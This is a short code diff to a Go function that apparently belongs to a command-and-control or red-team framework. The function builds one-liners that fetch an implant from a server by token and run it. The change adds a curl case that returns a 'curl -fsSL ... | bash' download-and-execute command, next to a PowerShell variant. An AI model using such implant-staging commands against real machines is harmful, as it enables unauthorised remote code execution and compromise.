@@ -86,7 +86,7 @@ func GenerateOneliner(input OnelinerInput) (string, error) {
 	downloadURL := fmt.Sprintf("%s/d/%s", baseURL, input.ImplantToken)
 
 	switch input.Kind {
-	case OnelinerBashHTTP:
+	case OnelinerBashHTTP, OnelinerCurl:
 		return fmt.Sprintf(`curl -fsSL '%s' | bash`, downloadURL), nil
 
 	case OnelinerPowerShellHTTP:
